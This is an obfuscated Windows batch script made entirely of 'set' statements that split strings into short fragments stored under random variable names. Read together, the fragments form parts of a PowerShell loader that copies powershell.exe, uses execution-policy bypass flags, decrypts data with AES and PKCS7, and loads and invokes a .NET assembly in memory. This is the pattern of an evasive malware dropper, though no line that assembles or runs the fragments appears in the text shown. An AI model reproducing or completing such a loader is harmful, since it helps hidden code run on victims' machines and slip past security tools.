@echo off
set "nyBMeOjIQk=Po"
set "UXOFFUIDkW=do"
set "PsZvwtZPSL=he"
set "wgAIHlnkOc=ow"
set "YNQJrhOKgc=.e"
set "KhHbDbBpep=y "
set "cDxAyVKtdF=Wi"
set "AtMabyqkSE= /"
set "YujAHkyiea=s\"
set "QFyOeLpoWK=py"
set "yzzikdCUvA=32"
set "JdmcoDgGzV=po"
set "BzItuziFLo=we"
set "nhleIsBUTC=ll"
set "uiMvZVdOSm=st"
set "RjonbhsCXY=0\"
set "vqOFJiUWtg=\v"
set "RqheTiOMlj=co"
set "tissbHfTsQ=ws"
set "BFcXgiAmWa=xe"
set "pvDfwWHEjJ=nd"
set "hfDFsYrXQK=rS"
set "NVJDVjMHlD= C"
set "CEsnacMVev=:\"
set "oYUeGnlOfN=we"
set "LaMaHuooLN=ll"
set "IzEaGVmdyl=em"
set "wlRgptNLak=1."
set "hJpRraODZr=in"
set "UVliewvcAR=he"
set "ztEGngamRd=Sy"
set "latKIQIOBL=\W"
set "GCoBWmcADC=rs"
set "gqwPUdZoyO=cd"
set "rAPUkjcvdW= %~dp0"
set "hRoahoSntV=]::("
set "UQQJJAFWXG=m.Re"
set "ccSabcsGub= = $"
set "lJNKfyfIHl=lBlo"
set "fjETOClOdS=Conv"
set "CkyibrKfxJ=C = "
set "hefzntjINr=ay()"
set "SJGQECILrC=join"
set "ljcYCxKYxk=FomB"
set "CaPATuhWeq=DsSw"
set "yEiHVALnkD=Secu"
set "MaeJSAkLoS=, $F"
set "ryjYxflXiO=Stre"
set "kATnZCmjvp=();$"
set "IHeQQJsjpi=$tUZ"
set "PFWDXpjWPz=1] -"
set "ceDaAOWKVA=bjec"
set "vVoRmFodza=Syst"
set "hGCPypTing=ion."
set "dPuelRuItA=::('"
set "kBEQaNkhjS=$tUZ"
set "pfRjGzJpyr=TllA"
set "GmAJQeWIgJ=nage"
set "KESXbYPwYd=flec"
set "RpFUGeuiYs=e]::"
set "uKIHEezdQw=;$Ai"
set "RYNlKHZkqr=ispo"
set "dlksBeBLXz=ing("
set "KDOIfmJgWI=New-"
set "lbGIIKwsYq=[Sys"
set "qTrjdXLsMK=rofi"
set "OAbnmxHWyg= '')"
set "HocNUnjEYB=  $c"
set "XPSAjwpNEC=; };"
set "VWFWbiGfHE=[Sys"
set "qMNFfLVGao=and "
set "IPCMOGTZIC=y]::"
set "qKGDbhLqjM=comm"
set "CKoiVRxcHo=$dDs"
set "JzrKAfnFly=w.Pa"
set "rMoiCuxEAO=UZYE"
set "nGyPLxNtXU=$Fom"
set "JUxcIhjciL=);$F"
set "lHYXrgVDST=bstr"
set "NrHgCpjtor=Comp"
set "kSZAJiefel=, (,"
set "VwoAoRvsnV=embl"
set "hdBqFuqwWb=y.Cr"
set "kTvnvUlrrh=Syst"
set "uFFNpqvUFh=ct S"
set "vzWDIiyBRm=File"
set "HyxASmvmxF=n ''"
set "qsdzsQNyld=PKCS"
set "PEShIIiVDA=gsYZ"
set "aaIOnMdfSo=FomB"
set "REKqZnWzXY=.Len"
set "qvMKbdvKww=[Sys"
set "OZbiLSTGEg=pose"
set "zuXDusohab=brea"
set "GjugVdpWdN=Aihi"
set "YFShAjDZSh=stem"
set "vWDEhHMrRo=AQj."
set "fEVOHnRsxz=)) {"
set "ZWHhUswEaJ=vert"
set "HNwgSdVupf='[-1"
set "RmGvgdtVvf=ew-O"
set "iUiuDtUGfe=oArr"
set "FXaKErRSrg=bypa"
set "jgJKVMBDmR=pIJp"
set "wiUJKgswJu=tem."
set "QDxbJriuze=-nop"
set "qKWgPQVJRP=esMa"
set "meoiwhcRej=Secu"
set "AqaaHLObXZ=$RpI"
set "NMJZvFqlPl= [st"
set "EzLMjINDNg=ose("
set "sWFStWhUVq=Star"
set "aymaNSrocw=('Tg"
set "IRQdcAFDUg=lit("
set "EpLMgsvpAj=ionM"
set "zAWqHGfRkK=Obje"
set "cBCyClRVFw=stem"
set "PBFWaxPjls=.Cre"
set "ELtrNNJVqY=RpIJ"
set "fTfZISlGue=R = "
set "bhzKfnfsrb=n ''"
set "siATXOjXJf=raph"
set "EsPhvRkCjO=();$"
set "vhPqWzFlCh=.Ass"
set "jANJPhFRuU='gni"
set "IWqMIPMjCd=vJZA"
set "gcxzeLUcFm=ecry"
set "ETygruGHAe=YE);"
set "CLDpNwNeoS=ment"
set "vMgnLpOAIW=esaB"
set "KfHsoJzdjC=ypto"
set "akDVSmvkaJ=.Com"
set "rGdfNQbktz=Fouv"
set "CoTRJXAWWS=ptor"
set "UXtXDcQKJb=eMVs"
set "lnQDFIVXoy=e = "
set "fVmfqyNhyN=;$sU"
set "GIhruqfooG=y.Ci"
set "hAtyUajYtG= = $"
set "ClZMvqWRga=:: '"
set "EATTebhvOD='')("
set "CrARCukeuj=Obje"
set "DRiMHQaUjD=.Dis"
set "CbJoJVrEaB=ose("
set "GdawmeWSJi=m) {"
set "VWIMvYmCCH=s75K"
set "MxNNpmEKlP=ode]"
set "hsTFJzBPaQ=y.Su"
set "vxKjgXFRuZ=1..-"
set "LRwVJtokEm=ddin"
set "NHPYSqzzXg=d;$d"
set "tiYudIIfji=S46e"
set "EBwAGqtaaI=g = "
set "QabCHSOzfx=gth)"
set "ELOqbaLkMC=Disp"
set "YikkyEsgzl=;$lf"
set "gfxVvFFkot=pStr"
set "hLKQcbQMzG=($VN"
set "aWRRsWSVrq=.Mod"
set "yEfQgQFmSr=omBC"
set "vtqmgzVvVH=]::("
set "DcuVMnwNJE=New-"
set "JUDEWqChGG=..-1"
set "UZwcoHcwbF=tryP"
set "DMDZQRPrHZ=C = "
set "zhOxtJnHYj=$Fom"
set "iTazsZnrJY=saBm"
set "CaEMegTLgy=YE ="
set "nCKAXmyRfI=($VN"
set "IfgZYObAPk=l5E7"
set "gDXKOqVGQP=JAQj"
set "cUsLCeWLFz=-joi"
set "SsPJggcOGn=p = "
set "FCTgDOzmhA='0Pg"
set "BRZukkcaqP=$tUZ"
set "YhxrzjtCFz=m(, "
set "UTCiIdBosa=y.Pa"
set "EpatIQyDKv= '')"
set "JleygZLveo=PxEW"
set "wnYcLnLkEY=]::N"
set "PuwmDfdWGP=ne);"
set "yealhwvMxP=[-1."
set "gyDuhsnsyb=YxVw"
set "edhTjVGIHY=grap"
set "bSUyYaqFbB=Invo"
set "BhzUspJdTP=.Cry"
